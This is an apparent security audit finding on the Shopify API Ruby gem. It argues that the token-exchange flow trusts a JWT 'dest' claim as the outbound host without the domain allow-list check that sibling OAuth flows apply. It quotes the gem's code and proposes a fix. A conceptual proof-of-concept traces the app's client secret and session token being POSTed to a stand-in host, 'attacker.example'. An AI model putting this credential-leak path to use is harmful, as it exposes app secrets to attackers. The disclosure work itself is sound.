### Title
Session-token `dest` claim is trusted as the OAuth token-exchange host without domain validation, unlike sibling flows - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop/host it sends the app's `client_id`, `client_secret`, and the raw session token to directly from the JWT `dest` claim, without ever running it through `ShopifyAPI::Utils::ShopValidator.sanitize!`. Every other credential-bearing OAuth flow in the same module family (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`) explicitly sanitizes the caller-supplied `shop` before using it as the request host. `TokenExchange` breaks that same identity binding: "the shop that is cryptographically bound to the request" is treated as equal to "the shop that is safe to use as an outbound host for the app's secret," when in fact only the former is actually established.

### Finding Description
`JwtPayload#initialize` decodes the token and only checks that the signature is valid and that `aud == Context.api_key` [1](#0-0) . It never validates `dest`/`iss` against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. `TokenExchange.exchange_token` then does:
```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
...
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
``` [2](#0-1) 

`Clients::HttpClient#initialize` builds the request host straight from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [3](#0-2) , and the request body carries `client_id`, `client_secret`, and `subject_token` (the raw session token) to that host [4](#0-3) .

By contrast, `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` both call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used for the outbound request that also carries `client_secret`: [5](#0-4) [6](#0-5) . `ShopValidator.sanitize!` exists specifically to constrain a shop string to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.com`, `myshopify.io`, `spin.dev`, `shop.dev`) and reject anything else [7](#0-6) .

`TokenExchange` is the one path that both (a) accepts a bearer-style credential handed to it from the surrounding host application/browser context and (b) skips this normalization, so the equality the gem otherwise enforces elsewhere — "the host that will receive `client_secret` == a domain-validated Shopify host" — does not hold for this flow. The `dest` claim is trusted as an outbound destination without being bound to the same domain allow-list used everywhere else in the same module.

### Impact Explanation
If the `dest` claim value is ever anything other than a genuine Shopify-issued myshopify/plus-custom-domain string (e.g. due to token confusion, a malformed/relayed token, or future changes in how `dest` is populated), the app's `client_id` and `client_secret` — its most sensitive OAuth credential — along with the subject session token, would be POSTed to an arbitrary attacker-influenced host. This is SSRF carrying the app's credentials, matching the "High" impact bar in scope.

### Likelihood Explanation
Under the current, correctly-functioning Shopify token-issuance behavior, `dest` is signed by the app's own secret and thus not forgeable by a generic unprivileged attacker, which limits immediate exploitability. However, this is a structural defense-in-depth gap: it is the *only* credential-sending flow in the gem that omits the `ShopValidator` check that every sibling flow performs, so it silently relies on a single validation layer (signature + `aud` match) instead of the two-layer control (signature + domain allow-list) used elsewhere. Any weakening of the JWT decoding path (e.g., issues in `old_api_secret_key` handling, or any relaying/proxying of `dest` before it reaches this code) turns this into a directly exploitable SSRF-with-credentials primitive, unlike in `ClientCredentials`/`RefreshToken` where it is not.

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (as `ClientCredentials` and `RefreshToken` already do) before constructing `shop_session`/`HttpClient`, and additionally validate the JWT's `iss`/`dest` against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` inside `JwtPayload` itself so every consumer of the payload benefits from the same binding.

### Proof of Concept
```ruby
# Conceptual: any code path that produces a JwtPayload whose `dest`
# is not constrained to TRUSTED_SHOPIFY_DOMAINS will cause exchange_token
# to POST client_id/client_secret/subject_token to that host, e.g.:
#
# payload dest: "https://attacker.example"
# => JwtPayload#shop => "attacker.example"
# => Session.new(shop: "attacker.example")
# => HttpClient base_uri => "https://attacker.example"
# => client.request(... body: {client_id, client_secret, subject_token, ...})
#
# Compare with ClientCredentials.client_credentials(shop: "attacker.example")
# which raises ShopifyAPI::Errors::InvalidShopError via ShopValidator.sanitize!
# before ever constructing the HttpClient.
``` [8](#0-7)

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L33-45)
```ruby
        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-33)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** test/auth/client_credentials_test.rb (L33-37)
```ruby
      def test_client_credentials_rejects_non_shopify_domain
        assert_raises(ShopifyAPI::Errors::InvalidShopError) do
          ShopifyAPI::Auth::ClientCredentials.client_credentials(shop: "attacker.example")
        end
      end
```
